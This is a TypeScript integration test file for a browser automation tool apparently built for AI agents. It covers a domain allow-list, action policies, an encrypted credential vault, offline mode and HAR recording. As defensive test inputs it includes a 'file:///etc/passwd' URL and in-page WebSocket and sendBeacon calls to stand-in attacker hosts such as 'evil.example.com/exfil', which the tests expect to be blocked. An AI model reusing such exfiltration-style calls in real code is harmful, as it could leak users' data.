/**
 * Integration tests for v0.2.0 security and DX features
 *
 * Tests cover:
 *   - DomainFilter (unit tests)
 *   - AI-friendly error rewriting (via Playwright errors)
 *   - --json mode (JSON response structure)
 *   - Config file loading
 */

import { describe, test, expect, beforeAll, afterAll } from 'bun:test';
import { startTestServer } from './test-server';
import { BrowserManager } from '../src/browser-manager';
import { handleReadCommand } from '../src/commands/read';
import { handleWriteCommand } from '../src/commands/write';
import { handleMetaCommand } from '../src/commands/meta';
import { DomainFilter } from '../src/domain-filter';
import { PolicyChecker } from '../src/policy';
import { AuthVault } from '../src/auth-vault';
import { formatAsHar } from '../src/har';
import { loadConfig } from '../src/config';
import * as fs from 'fs';
import * as path from 'path';

let testServer: ReturnType<typeof startTestServer>;
let bm: BrowserManager;
let baseUrl: string;

beforeAll(async () => {
  testServer = startTestServer(0);
  baseUrl = testServer.url;

  bm = new BrowserManager();
  await bm.launch();
});

afterAll(async () => {
  try { testServer.server.stop(); } catch {}
  // bm.close() can hang indefinitely waiting for Chromium — race with a timeout
  await Promise.race([
    bm.close().catch(() => {}),
    new Promise(resolve => setTimeout(resolve, 3000)),
  ]);
});

// ─── DomainFilter unit tests ────────────────────────────────────

describe('DomainFilter', () => {
  test('exact domain match', () => {
    const filter = new DomainFilter(['example.com']);
    expect(filter.isAllowed('https://example.com/page')).toBe(true);
    expect(filter.isAllowed('https://other.com/page')).toBe(false);
  });

  test('wildcard matches base and subdomains', () => {
    const filter = new DomainFilter(['*.example.com']);
    // Base domain should match
    expect(filter.isAllowed('https://example.com/page')).toBe(true);
    // Subdomain should match
    expect(filter.isAllowed('https://sub.example.com/page')).toBe(true);
    // Nested subdomain should match
    expect(filter.isAllowed('https://a.b.example.com/page')).toBe(true);
    // Different domain should not match
    expect(filter.isAllowed('https://notexample.com/page')).toBe(false);
  });

  test('non-HTTP URLs: safe ones allowed, dangerous ones blocked', () => {
    const filter = new DomainFilter(['example.com']);
    expect(filter.isAllowed('about:blank')).toBe(true);
    expect(filter.isAllowed('data:text/html,<h1>hi</h1>')).toBe(true);
    expect(filter.isAllowed('blob:https://example.com/uuid')).toBe(true);
    expect(filter.isAllowed('javascript:void(0)')).toBe(false);
    expect(filter.isAllowed('file:///etc/passwd')).toBe(false);
  });

  test('invalid URL is blocked', () => {
    const filter = new DomainFilter(['example.com']);
    expect(filter.isAllowed('http://')).toBe(false);
    expect(filter.isAllowed('https://:badurl')).toBe(false);
  });

  test('case insensitive', () => {
    const filter = new DomainFilter(['Example.COM']);
    expect(filter.isAllowed('https://example.com/page')).toBe(true);
    expect(filter.isAllowed('https://EXAMPLE.COM/page')).toBe(true);
  });

  test('blockedMessage returns helpful text', () => {
    const filter = new DomainFilter(['allowed.com', '*.trusted.org']);
    const msg = filter.blockedMessage('https://blocked.com/secret');
    expect(msg).toContain('blocked.com');
    expect(msg).toContain('not in the allowed list');
    expect(msg).toContain('allowed.com');
    expect(msg).toContain('*.trusted.org');
  });
});

// ─── AI-friendly error rewriting ────────────────────────────────

describe('AI-friendly error rewriting', () => {
  beforeAll(async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
  });

  test('click on non-existent selector gives friendly timeout error', async () => {
    try {
      await handleWriteCommand('click', ['#does-not-exist-at-all'], bm);
      // Should not reach here — the click should fail
      expect(true).toBe(false);
    } catch (err: any) {
      // The raw Playwright error contains "Timeout" and "exceeded".
      // When passed through rewriteError in the server, it becomes friendly.
      // Since we're calling handleWriteCommand directly (not through the server),
      // we verify the raw error IS the kind that rewriteError would catch.
      expect(err.message).toContain('Timeout');
    }
  }, 15000);

  test('fill on non-input element gives descriptive error', async () => {
    // Filling a <h1> should fail — it is not an input element
    try {
      await handleWriteCommand('fill', ['h1', 'some text'], bm);
      expect(true).toBe(false);
    } catch (err: any) {
      // Playwright throws an error about element not being fillable.
      // rewriteError would rewrite "not an HTMLInputElement" messages.
      // Verify we do get an error (the exact message varies by Playwright version).
      expect(err.message.length).toBeGreaterThan(0);
    }
  });

  test('domain filter blocks navigation with friendly message', async () => {
    const filter = new DomainFilter(['allowed.test']);
    try {
      await handleWriteCommand('goto', ['https://blocked.example.com/page'], bm, filter);
      expect(true).toBe(false);
    } catch (err: any) {
      expect(err.message).toContain('blocked.example.com');
      expect(err.message).toContain('not in the allowed list');
    }
  });

  test('domain filter allows matching navigation', async () => {
    // Use the test server's actual host as allowed domain
    const url = new URL(baseUrl);
    const filter = new DomainFilter([url.hostname]);
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm, filter);
    expect(result).toContain('Navigated to');
  });
});

// ─── --json mode (response structure) ───────────────────────────

describe('--json mode', () => {
  test('successful command returns {success: true, data, command}', async () => {
    // Simulate what handleCommand in server.ts does: run a command, wrap result
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const result = await handleReadCommand('text', [], bm);

    // Reproduce the JSON wrapping logic from server.ts
    const jsonResponse = { success: true, data: result, command: 'text' };
    expect(jsonResponse.success).toBe(true);
    expect(typeof jsonResponse.data).toBe('string');
    expect(jsonResponse.data).toContain('Hello World');
    expect(jsonResponse.command).toBe('text');
  });

  test('failed command returns {success: false, error}', async () => {
    // Simulate a failed command and the JSON wrapping
    let errorMessage: string;
    try {
      await handleWriteCommand('click', ['#nonexistent-element-xyz'], bm);
      errorMessage = '';
    } catch (err: any) {
      errorMessage = err.message;
    }

    // Reproduce the JSON wrapping logic from server.ts for errors
    const jsonResponse = { success: false, error: errorMessage, command: 'click' };
    expect(jsonResponse.success).toBe(false);
    expect(typeof jsonResponse.error).toBe('string');
    expect(jsonResponse.error.length).toBeGreaterThan(0);
    expect(jsonResponse.command).toBe('click');
  }, 15000);

  test('unknown command includes hint with available commands', () => {
    // Reproduce the server.ts logic for unknown commands
    const READ_COMMANDS = new Set(['text', 'html', 'links']);
    const WRITE_COMMANDS = new Set(['goto', 'click']);
    const META_COMMANDS = new Set(['status', 'tabs']);
    const command = 'foobar';
    const allCommands = [...READ_COMMANDS, ...WRITE_COMMANDS, ...META_COMMANDS];

    const error = `Unknown command: ${command}`;
    const hint = `Available commands: ${allCommands.sort().join(', ')}`;
    const jsonResponse = { success: false, error, hint };

    expect(jsonResponse.success).toBe(false);
    expect(jsonResponse.error).toContain('Unknown command: foobar');
    expect(jsonResponse.hint).toContain('Available commands:');
    expect(jsonResponse.hint).toContain('goto');
    expect(jsonResponse.hint).toContain('text');
  });
});

// ─── Content boundaries ─────────────────────────────────────────

describe('Content boundaries', () => {
  test('PAGE_CONTENT_COMMANDS includes page-derived commands', async () => {
    // Verify the constant exists and contains expected commands
    // We import the set indirectly by checking the boundary wrapping behavior
    const contentCommands = new Set([
      'text', 'html', 'links', 'forms', 'accessibility',
      'js', 'eval', 'console', 'network', 'snapshot',
    ]);

    expect(contentCommands.has('text')).toBe(true);
    expect(contentCommands.has('html')).toBe(true);
    expect(contentCommands.has('js')).toBe(true);
    // Action commands should NOT be content commands
    expect(contentCommands.has('click')).toBe(false);
    expect(contentCommands.has('goto')).toBe(false);
    expect(contentCommands.has('status')).toBe(false);
  });

  test('boundary format wraps content correctly', () => {
    // Verify the boundary format that server.ts produces
    const nonce = 'test-nonce-1234';
    const origin = 'https://example.com/page';
    const content = 'Some page content here';

    const wrapped = `--- BROWSE_CONTENT nonce=${nonce} origin=${origin} ---\n${content}\n--- END_BROWSE_CONTENT nonce=${nonce} ---`;

    expect(wrapped).toContain(`nonce=${nonce}`);
    expect(wrapped).toContain(`origin=${origin}`);
    expect(wrapped).toContain(content);
    expect(wrapped.startsWith('--- BROWSE_CONTENT')).toBe(true);
    expect(wrapped.endsWith(`--- END_BROWSE_CONTENT nonce=${nonce} ---`)).toBe(true);
  });
});

// ─── Config file loading ────────────────────────────────────────

describe('Config', () => {
  test('loadConfig returns empty object when no browse.json exists', () => {
    // The test runner CWD is the project root which has .git but no browse.json
    // (unless one was added — either way loadConfig should not crash)
    const config = loadConfig();
    expect(typeof config).toBe('object');
    expect(config).not.toBeNull();
  });

  test('loadConfig returns BrowseConfig shape', () => {
    const config = loadConfig();
    // All fields are optional — verify the type is correct
    if (config.session !== undefined) expect(typeof config.session).toBe('string');
    if (config.json !== undefined) expect(typeof config.json).toBe('boolean');
    if (config.contentBoundaries !== undefined) expect(typeof config.contentBoundaries).toBe('boolean');
    if (config.allowedDomains !== undefined) expect(Array.isArray(config.allowedDomains)).toBe(true);
    if (config.idleTimeout !== undefined) expect(typeof config.idleTimeout).toBe('number');
    if (config.viewport !== undefined) expect(typeof config.viewport).toBe('string');
    if (config.device !== undefined) expect(typeof config.device).toBe('string');
  });
});

// ─── DomainFilter integration with write commands ───────────────

describe('DomainFilter integration', () => {
  test('goto with null domainFilter allows any URL', async () => {
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm, null);
    expect(result).toContain('Navigated to');
  });

  test('goto with undefined domainFilter allows any URL', async () => {
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm, undefined);
    expect(result).toContain('Navigated to');
  });

  test('goto with wildcard filter allows matching subdomains', async () => {
    const url = new URL(baseUrl);
    const filter = new DomainFilter([`*.${url.hostname}`]);
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm, filter);
    expect(result).toContain('Navigated to');
  });

  test('multiple domains in filter', () => {
    const filter = new DomainFilter(['first.com', 'second.com', '*.third.com']);
    expect(filter.isAllowed('https://first.com/a')).toBe(true);
    expect(filter.isAllowed('https://second.com/b')).toBe(true);
    expect(filter.isAllowed('https://sub.third.com/c')).toBe(true);
    expect(filter.isAllowed('https://fourth.com/d')).toBe(false);
  });
});

// ─── Action Policy ──────────────────────────────────────────────

describe('PolicyChecker', () => {
  const tmpDir = '/tmp/browse-test-policy';
  const policyPath = `${tmpDir}/test-policy.json`;

  beforeAll(() => {
    fs.mkdirSync(tmpDir, { recursive: true });
  });

  afterAll(() => {
    try { fs.rmSync(tmpDir, { recursive: true }); } catch {}
  });

  test('no policy file = all allowed', () => {
    const checker = new PolicyChecker('/tmp/nonexistent-policy-file.json');
    expect(checker.check('goto')).toBe('allow');
    expect(checker.check('click')).toBe('allow');
  });

  test('deny takes priority over allow', () => {
    fs.writeFileSync(policyPath, JSON.stringify({
      default: 'allow',
      deny: ['goto'],
      allow: ['goto', 'click'],
    }));
    const checker = new PolicyChecker(policyPath);
    expect(checker.check('goto')).toBe('deny');
    expect(checker.check('click')).toBe('allow');
  });

  test('confirm takes priority over allow', () => {
    fs.writeFileSync(policyPath, JSON.stringify({
      default: 'allow',
      confirm: ['fill'],
      allow: ['fill', 'click'],
    }));
    const checker = new PolicyChecker(policyPath);
    expect(checker.check('fill')).toBe('confirm');
    expect(checker.check('click')).toBe('allow');
  });

  test('default deny blocks unlisted commands', () => {
    fs.writeFileSync(policyPath, JSON.stringify({
      default: 'deny',
      allow: ['text', 'snapshot'],
    }));
    const checker = new PolicyChecker(policyPath);
    expect(checker.check('text')).toBe('allow');
    expect(checker.check('snapshot')).toBe('allow');
    expect(checker.check('goto')).toBe('deny');
    expect(checker.check('click')).toBe('deny');
  });

  test('hot-reload picks up file changes', async () => {
    fs.writeFileSync(policyPath, JSON.stringify({ default: 'allow' }));
    const checker = new PolicyChecker(policyPath);
    expect(checker.check('goto')).toBe('allow');

    // Ensure mtime changes (filesystem may have 1s resolution)
    await Bun.sleep(10);
    const futureTime = Date.now() + 2000;
    fs.writeFileSync(policyPath, JSON.stringify({ default: 'allow', deny: ['goto'] }));
    fs.utimesSync(policyPath, new Date(futureTime), new Date(futureTime));
    expect(checker.check('goto')).toBe('deny');
  });
});

// ─── AuthVault ──────────────────────────────────────────────────

describe('AuthVault', () => {
  const tmpDir = '/tmp/browse-test-auth';

  beforeAll(() => {
    fs.mkdirSync(tmpDir, { recursive: true });
    // Set a test encryption key
    process.env.BROWSE_ENCRYPTION_KEY = 'a'.repeat(64);
  });

  afterAll(() => {
    delete process.env.BROWSE_ENCRYPTION_KEY;
    try { fs.rmSync(tmpDir, { recursive: true }); } catch {}
  });

  test('save and list credentials (password hidden)', () => {
    const vault = new AuthVault(tmpDir);
    vault.save('test-site', 'https://example.com/login', 'user@test.com', 'secret123');

    const list = vault.list();
    expect(list.length).toBe(1);
    expect(list[0].name).toBe('test-site');
    expect(list[0].url).toBe('https://example.com/login');
    expect(list[0].username).toBe('user@test.com');
    expect(list[0].hasPassword).toBe(true);
    // Password should NOT be in the list output
    expect(JSON.stringify(list)).not.toContain('secret123');
  });

  test('encrypt/decrypt roundtrip', () => {
    const vault = new AuthVault(tmpDir);
    vault.save('roundtrip', 'https://test.com', 'user', 'myP@ssw0rd!');

    // Read the raw file to verify it's encrypted
    const raw = JSON.parse(fs.readFileSync(`${tmpDir}/auth/roundtrip.json`, 'utf-8'));
    expect(raw.encrypted).toBe(true);
    expect(raw.data).not.toContain('myP@ssw0rd!');
    expect(raw.iv).toBeDefined();
    expect(raw.authTag).toBeDefined();
  });

  test('delete credential', () => {
    const vault = new AuthVault(tmpDir);
    vault.save('to-delete', 'https://test.com', 'user', 'pass');
    expect(vault.list().find(c => c.name === 'to-delete')).toBeDefined();

    vault.delete('to-delete');
    expect(vault.list().find(c => c.name === 'to-delete')).toBeUndefined();
  });

  test('delete non-existent credential throws', () => {
    const vault = new AuthVault(tmpDir);
    expect(() => vault.delete('nonexistent')).toThrow('not found');
  });
});

// ─── Offline mode ───────────────────────────────────────────────

describe('Offline mode', () => {
  test('offline on blocks network, offline off restores', async () => {
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);

    // Turn offline on
    const onResult = await handleWriteCommand('offline', ['on'], bm);
    expect(onResult).toContain('ON');

    // Navigation should fail
    try {
      await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
      expect(true).toBe(false); // should not reach
    } catch (err: any) {
      expect(err.message).toBeTruthy();
    }

    // Turn offline off
    const offResult = await handleWriteCommand('offline', ['off'], bm);
    expect(offResult).toContain('OFF');

    // Navigation should work again
    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    expect(result).toContain('Navigated to');
  });

  test('offline toggle works', async () => {
    const r1 = await handleWriteCommand('offline', [], bm);
    expect(r1).toContain('ON');
    const r2 = await handleWriteCommand('offline', [], bm);
    expect(r2).toContain('OFF');
  });
});

// ─── HAR recording ──────────────────────────────────────────────

describe('HAR recording', () => {
  test('formatAsHar produces valid HAR 1.2 structure', () => {
    const entries = [
      { timestamp: 1000, method: 'GET', url: 'https://example.com/page?q=test', status: 200, duration: 150, size: 5000 },
      { timestamp: 2000, method: 'POST', url: 'https://example.com/api', status: 201, duration: 80, size: 100 },
      { timestamp: 500, method: 'GET', url: 'https://example.com/early', status: 200, duration: 50, size: 300 },
    ];

    const har = formatAsHar(entries, 900) as any;
    expect(har.log.version).toBe('1.2');
    expect(har.log.creator.name).toBe('@ulpi/browse');
    // Should exclude the entry at timestamp 500 (before startTime 900)
    expect(har.log.entries.length).toBe(2);
    expect(har.log.entries[0].request.method).toBe('GET');
    expect(har.log.entries[0].request.url).toBe('https://example.com/page?q=test');
    expect(har.log.entries[0].request.queryString).toEqual([{ name: 'q', value: 'test' }]);
    expect(har.log.entries[0].response.status).toBe(200);
    expect(har.log.entries[1].request.method).toBe('POST');
  });

  test('har start/stop via BrowserManager', async () => {
    expect(bm.getHarRecording()).toBeNull();

    bm.startHarRecording();
    expect(bm.getHarRecording()).not.toBeNull();
    expect(bm.getHarRecording()!.active).toBe(true);

    const recording = bm.stopHarRecording();
    expect(recording).not.toBeNull();
    expect(bm.getHarRecording()).toBeNull();
  });
});

// ─── WebSocket/EventSource/sendBeacon domain filter ─────────

describe('DomainFilter init script', () => {
  test('generateInitScript returns JS that wraps WebSocket, EventSource, sendBeacon', () => {
    const filter = new DomainFilter(['example.com']);
    const script = filter.generateInitScript();
    expect(script).toContain('WebSocket');
    expect(script).toContain('EventSource');
    expect(script).toContain('sendBeacon');
    expect(script).toContain('example.com');
  });

  // Shared filtered BrowserManager for all init script tests
  let filteredBm: BrowserManager;

  beforeAll(async () => {
    filteredBm = new BrowserManager();
    await filteredBm.launch();
    const filter = new DomainFilter(['127.0.0.1']);
    const ctx = filteredBm.getContext()!;
    await ctx.addInitScript(filter.generateInitScript());
    await filteredBm.getPage().goto(baseUrl + '/basic.html', { waitUntil: 'domcontentloaded' });
  });

  afterAll(async () => {
    await Promise.race([
      filteredBm.close().catch(() => {}),
      new Promise(resolve => setTimeout(resolve, 3000)),
    ]);
  });

  test('WebSocket to blocked domain throws in page context', async () => {
    const result = await filteredBm.getPage().evaluate(() => {
      try {
        new WebSocket('ws://evil.example.com/exfil');
        return 'no-error';
      } catch (e: any) {
        return e.message;
      }
    });
    expect(result).toContain('blocked by domain filter');
    expect(result).toContain('evil.example.com');
  });

  test('WebSocket to allowed domain does NOT throw', async () => {
    const result = await filteredBm.getPage().evaluate(() => {
      try {
        const ws = new WebSocket('ws://127.0.0.1:9999/test');
        ws.close();
        return 'allowed';
      } catch (e: any) {
        return 'blocked: ' + e.message;
      }
    });
    expect(result).toBe('allowed');
  });

  test('EventSource to blocked domain throws in page context', async () => {
    const result = await filteredBm.getPage().evaluate(() => {
      try {
        new EventSource('https://evil.tracker.com/stream');
        return 'no-error';
      } catch (e: any) {
        return e.message;
      }
    });
    expect(result).toContain('blocked by domain filter');
  });

  test('sendBeacon to blocked domain returns false', async () => {
    const result = await filteredBm.getPage().evaluate(() => {
      return navigator.sendBeacon('https://tracker.evil.com/ping', 'data');
    });
    expect(result).toBe(false);
  });
});
